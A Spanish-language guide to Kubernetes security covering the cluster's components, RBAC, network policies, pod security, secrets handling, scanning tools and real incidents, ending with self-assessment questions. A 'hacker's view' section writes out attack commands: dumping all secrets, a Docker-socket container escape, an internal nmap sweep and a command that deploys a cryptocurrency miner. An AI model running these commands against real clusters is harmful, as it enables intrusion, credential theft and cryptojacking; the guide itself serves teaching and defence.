---
title: "Seguridad en Kubernetes (K8s): El Director de Orquesta"
level: "avanzado"
content_type: "guia"
updated: "2026-06-29"
---

# Seguridad en Kubernetes (K8s): El Director de Orquesta

## Objetivo de esta Guía

Entender que hace Kubernetes, por qué es el rey absoluto de la Nube, y como hackearlo significa ganar el juego instantáneamente.

Si tienes 3 contenedores de Docker (las cajas de cristal de la guía anterior), puedes encenderlos a mano escribiendo comandos en la terminal de Linux. Pero las empresas como Netflix o Spotify no tienen 3 contenedores. Tienen 50,000 contenedores encendiéndose y apagándose cada segundo alrededor del mundo. Un humano no puede administrar eso. Necesitas un robot automatizado: Kubernetes.

## La Analogía

Tienes a 50,000 músicos de todos los instrumentos listos para tocar. Necesitan un Director de Orquesta. El Director no toca el violín (no ejecuta el código), el solo vigila a los músicos (los Contenedores de Docker). Si el violinista se muere de un infarto (se cae el servidor), el Director inmediatamente llama a otro violinista de repuesto y lo sienta en la silla sin que la sinfonía se detenga un solo segundo. A esto se le llama Orquestación de Contenedores.

## Componentes de Kubernetes

### El Clúster

Un clúster de Kubernetes tiene dos tipos de nodos:

1. **Control Plane (Master Node):** El Director de Orquesta. Toma todas las decisiones globales. Incluye:
   - API Server: El corazón de K8s. Recibe todas las órdenes.
   - etcd: Base de datos clave-valor que guarda el estado del clúster.
   - Scheduler: Decide en que nodo ejecutar cada contenedor.
   - Controller Manager: Ejecuta los controladores (replicación, nodos, etc.).

2. **Worker Nodes:** Los músicos. Ejecutan los contenedores. Incluyen:
   - kubelet: Agente que se comunica con el Control Plane.
   - kube-proxy: Maneja las reglas de red.
   - Container Runtime: Docker, containerd, CRI-O.

### Objetos de Kubernetes

- **Pod:** La unidad más pequeña (la silla del músico). Contiene uno o más contenedores.
- **Deployment:** Define como crear y escalar pods.
- **Service:** Expone los pods al exterior (balanceo de carga).
- **ConfigMap / Secret:** Configuración y datos sensibles.
- **Ingress:** Enrutamiento HTTP/HTTPS hacia servicios.
- **Namespace:** Particion lógica del clúster (entornos de trabajo aislados).

## La Arquitectura de Seguridad de Kubernetes

Kubernetes tiene un modelo de seguridad por capas. Cada capa debe configurarse correctamente.

### Capa 1: Seguridad del API Server

El API Server es el punto de entrada a todo el clúster. Cualquier comando (kubectl, dashboard, CI/CD) pasa por el.

**Autenticación:** El API Server soporta múltiples métodos:

- Certificados TLS (cliente).
- Tokens Bearer (Service Accounts, OIDC, Webhook).
- Basic Auth (no recomendado).
- Proxy de autenticación.

**Error Común:** Dejar el API Server expuesto a internet sin autenticación. Cualquiera puede ejecutar `kubectl` contra el clúster.

**Caso Real:** En 2018, Tesla tuvo su dashboard de Kubernetes expuesto sin autenticación. Atacantes desplegaron contenedores de minería de criptomonedas.

### Capa 2: RBAC (Role-Based Access Control)

RBAC define quien puede hacer que en Kubernetes. Sin RBAC, cualquier usuario con acceso al API Server tiene permisos de administrador.

**Componentes de RBAC:**

1. **Role / ClusterRole:** Conjunto de permisos. Role es para un namespace, ClusterRole es para todo el clúster.

Ejemplo de Role:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: desarrollo
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
```

2. **RoleBinding / ClusterRoleBinding:** Conecta un Role con un usuario o grupo.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: desarrollo
  name: read-pods
subjects:
- kind: User
  name: juan
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

**Principio del Menor Privilegio en K8s:**

- No usar el ClusterRole `cluster-admin` a menos que sea estrictamente necesario.
- Crear roles específicos para cada tarea.
- Usar Namespaces para aislar entornos (producción, desarrollo, pruebas).

### Capa 3: Network Policies

Por qué esto importa: sin Network Policies, es como tener un edificio donde todas las puertas están abiertas todo el tiempo.

Por defecto en Kubernetes, todos los pods pueden comunicarse entre si. No hay restricciones de red. Esto es inseguro.

Las Network Policies definen reglas de tráfico entre pods:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

Esta política bloquea todo el tráfico entrante y saliente al namespace donde se aplica.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-db
spec:
  podSelector:
    matchLabels:
      app: database
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web
    ports:
    - port: 5432
```

Esta política solo permite tráfico desde pods con la etiqueta `app: web` hacia pods con la etiqueta `app: database` en el puerto 5432.

**Beneficios de las Network Policies:**

- Aislamiento de microservicios.
- Prevención de movimiento lateral.
- Cumplimiento normativo (PCI DSS, HIPAA).
- Segmentación Zero Trust.

### Capa 4: Pod Security Standards (PSS)

Antes llamado Pod Security Policies (PSP), ahora es Pod Security Admission (PSA). Define niveles de seguridad para pods:

1. **Privileged:** Sin restricciones. Solo para pods de sistema.
2. **Baseline:** Restricciones minimas. Evita escaladas de privilegios.
3. **Restricted:** Restricciones estrictas. Sigue las mejores prácticas.

Ejemplo de etiqueta de namespace para aplicar Restricted:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

Los pods que no cumplan con Restricted serán rechazados.

### Capa 5: Secrets Management

Kubernetes tiene un objeto llamado Secret para almacenar datos sensibles (contraseñas, tokens, llaves).

**Problema de Seguridad:** Los Secrets de Kubernetes solo están codificados en Base64 (no encriptados). Cualquiera con acceso al API Server o a etcd puede leerlos.

**Mejores prácticas:**

1. Usar encriptación en reposo para Secrets (encryption at rest).
2. Usar un proveedor externo como HashiCorp Vault, AWS Secrets Manager o Azure Key Vault.
3. No incluir Secrets en imágenes de contenedor.
4. Rotar Secrets periodicamente.

Ejemplo de Secret:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=
  password: cGFzc3dvcmQxMjM=
```

Los valores están en Base64. No es encriptación, es codificación.

### Capa 6: Service Accounts

Cada pod tiene una Service Account que determina sus permisos en el API Server.

**Error Común:** Usar la Service Account por defecto (`default`) que a menudo tiene permisos excesivos o innecesarios.

**Buena Práctica:** Crear Service Accounts específicas para cada aplicación y asignar solo los permisos necesarios.

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: mi-app
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: mi-app-reader
subjects:
- kind: ServiceAccount
  name: mi-app
roleRef:
  kind: Role
  name: pod-reader
```

### Capa 7: Admission Controllers

Los Admission Controllers son plugins que interceptan las solicitudes al API Server antes de que se ejecuten. Permiten validar o mutar recursos.

**Admission Controllers importantes para seguridad:**

1. **PodSecurity:** Aplica Pod Security Standards.
2. **AlwaysPullImages:** Fuerza a que las imágenes se descarguen siempre (evita imágenes locales maliciosas).
3. **NodeRestriction:** Limita los permisos de kubelet.
4. **DenyServiceExternalIPs:** Bloquea el uso de IPs externas en servicios.

## Escaneo de Vulnerabilidades en K8s

### Escaneo de Imagenes

Usar herramientas como Trivy, Snyk o Aqua Security para escanear imágenes de contenedor en busca de vulnerabilidades conocidas.

```bash
trivy image nginx:1.25.3
```

Esto detecta paquetes vulnerables en la imagen y reporta CVEs.

### Escaneo del Clúster

Usar herramientas como kube-bench (basado en CIS Benchmarks) para auditar la configuración del clúster:

```bash
kube-bench run --targets master,node
```

Esto verifica:
- Permisos de archivos.
- Configuración del API Server.
- Configuración de etcd.
- Configuración de kubelet.

### Falco (Runtime Security)

Falco es una herramienta de seguridad en tiempo de ejecución para Kubernetes. Detecta comportamiento anómalo:

- Shell ejecutándose en un contenedor.
- Montaje de dispositivos sensibles.
- Lectura de archivos de sistema.
- Conexiones de red sospechosas.

Ejemplo de regla de Falco:

```yaml
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: container.id != host and proc.name = bash
  output: "Shell spawned in a container"
  priority: WARNING
```

## Casos Reales

### Tesla Cryptojacking (2018)

Tesla tenía un dashboard de Kubernetes expuesto a internet sin autenticación. Atacantes:

1. Encontraron el dashboard via Shodan (buscador de dispositivos conectados).
2. Crearon un deployment con contenedores de minería de criptomonedas.
3. Usaron los recursos GPU de Tesla para minar.
4. Tesla recibio la factura de cómputo.

El ataque fue detectado por un equipo de seguridad externo (RedLock) que encontró el dashboard expuesto.

### El Ataque a Capital One y Kubernetes (2019)

El ataque a Capital One involucro un SSRF que permitió a la atacante obtener credenciales de una instancia EC2. Esas credenciales le dieron acceso a buckets S3.

Aunque no fue un ataque directo a Kubernetes, el principio es el mismo: credenciales robadas de un servicio (en este caso, una app en EKS) dieron acceso a recursos cloud.

### Siloscape: Malware para Kubernetes (2021)

Siloscape fue el primer malware conocido diseñado específicamente para Kubernetes. Se propagaba a través de contenedores Windows y buscaba:

1. Escapar del contenedor.
2. Obtener acceso al nodo.
3. Moverse lateralmente a otros nodos.
4. Robar credenciales de clusters.

Siloscape usaba técnicas como el montaje del socket de Docker para escapar del contenedor.

## Modos de Falla

### Falla 1: Dashboard Expuesto sin Autenticación

El dashboard de Kubernetes es una interfaz web de administración. Si se expone sin autenticación, cualquiera puede controlar el clúster.

### Falla 2: RBAC No Configurado

Por defecto, Kubernetes no tiene RBAC activado en algunos proveedores. Sin RBAC, cualquiera con acceso al API Server es administrador.

### Falla 3: Network Policies No Configuradas

Sin Network Policies, todos los pods pueden comunicarse. Un atacante que comprometa un pod puede moverse lateralmente a cualquier otro pod.

### Falla 4: Secrets en Texto Claro

Almacenar contraseñas en Secrets sin encriptación adicional. Cualquiera con acceso a etcd puede leerlas.

### Falla 5: Contenedores como Root

Ejecutar contenedores como root dentro de K8s. Si el contenedor es comprometido, el atacante tiene acceso root al contenedor y potencialmente al nodo.

### Falla 6: Falta de Límites de Recursos

Pods sin límites de CPU/RAM pueden causar DoS a otros pods y nodos.

## La Mirada del Hacker

Como atacante, Kubernetes es un objetivo de alto valor. Si comprometo el clúster, tengo acceso a todas las aplicaciones y datos.

### Reconocimiento del Clúster

Cuando accedo a un clúster, ejecutó:

```bash
kubectl get nodes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get clusterroles
kubectl describe node
```

Cada comando me da información sobre la topologia del clúster y posibles vectores de ataque.

### Escalada de Privilegios en K8s

**Técnica 1: Acceso a Secrets**

Si puedo listar Secrets, busco contraseñas de bases de datos, API Keys y tokens de servicio.

```bash
kubectl get secrets -o yaml
```

**Técnica 2: Montar el Socket de Docker**

Si un pod tiene montado el socket de Docker, puedo escapar al nodo:

```bash
docker run -v /:/host -it alpine chroot /host
```

**Técnica 3: Service Account con Permisos Excesivos**

Si la Service Account del pod que comprometi tiene permisos de administrador, puedo crear nuevos pods, deployments o incluso modificar la configuración del clúster.

**Técnica 4: Acceso a etcd**

Si puedo acceder al pod de etcd en el Control Plane, puedo leer todos los datos del clúster, incluyendo Secrets.

### Movimiento Lateral en K8s

Sin Network Policies, puedo escanear la red interna del clúster:

```bash
apt-get install nmap
nmap -sn 10.0.0.0/8
```

Encuentro otros pods y servicios, y busco vulnerabilidades en ellos.

### Cryptojacking

Si tengo acceso para crear pods, despliego contenedores de minería:

```bash
kubectl run miner --image=xmrig/xmrig -- --url=pool.com --user=miwallet
```

El ataque consume recursos de CPU/GPU del clúster sin que el dueño se de cuenta hasta que llega la factura.

## Autoevaluación

Responde estas preguntas para verificar si comprendes los conceptos:

1. Basado en la analogía del Director de Orquesta, explica la diferencia de responsabilidades y nivel de riesgo entre un Worker Node (un músico) y el Control Plane (El Director). Por qué los atacantes modernos apuntan casi exclusivamente al Control Plane?

2. Un equipo de desarrollo despliega Kubernetes pero decide no configurar ninguna Network Policy. Un atacante logra vulnerar un contenedor público que hospeda un simple Blog de WordPress. Explica como la falta de Network Policies le permite al atacante moverse lateralmente para atacar la Base de Datos Financiera de la empresa alojada en el mismo clúster.

3. El API Server de Kubernetes es el cerebro que recibe y ejecuta todas las órdenes de orquestación. Si el equipo de IT deja el API Server expuesto al internet público sin requerir Tokens de Autenticación, describe un escenario de Cryptojacking y su impacto financiero letal.

4. Explica la función del sistema RBAC en Kubernetes. Si no existiera RBAC, Por qué un simple empleado del equipo de Soporte Técnico tendría el mismo poder destructivo que el Administrador Principal (Root) de la Nube?

5. Cual es la diferencia entre un Role y un ClusterRole en Kubernetes RBAC? Cuando usarías cada uno?

6. Un atacante compromete un pod en Kubernetes. Que información buscaría en los Secrets del namespace y como la usaria para escalar el ataque?

7. Explica el problema de seguridad de los Secrets de Kubernetes (almacenados en Base64) y como se pueden proteger usando encriptación en reposo o un proveedor externo como Vault.

8. Que es el ataque de Cryptojacking en Kubernetes y como se puede prevenir usando Resource Quotas y Limit Ranges?
